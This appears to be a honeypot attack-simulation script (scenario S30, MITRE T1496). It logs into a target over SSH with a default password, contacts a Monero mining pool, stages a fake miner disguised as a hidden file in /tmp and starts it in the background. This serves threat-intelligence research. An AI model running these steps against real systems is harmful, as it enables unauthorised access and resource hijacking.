#!/usr/bin/env bash
# S30 — Crypto Miner Deployment Attempt
# Tactic : Impact (TA0040)
# Technique: T1496 Resource Hijacking
# Note: network isolated — external download fails; binary copy and execution attempt
#       is the logged CTI value.
TARGET="${1:-safe-honeypot}"
SSH="sshpass -p admin ssh -o StrictHostKeyChecking=no -o ConnectTimeout=30 ${TARGET} -p 2222"
echo "=== S30 Crypto Miner Deployment — ${TARGET} ==="
timeout ${TIMEOUT:-45} $SSH "curl -s --max-time 5 https://pool.minexmr.com 2>&1 || echo 'external blocked (expected)'; mkdir -p /tmp/.cache; cp /bin/bash /tmp/.cache/.xmrig; chmod +x /tmp/.cache/.xmrig; ls -la /tmp/.cache/; nohup /tmp/.cache/.xmrig --help > /dev/null 2>&1 &; echo 'miner pid: '$!" && echo "[OK]" || echo "[FAIL]"
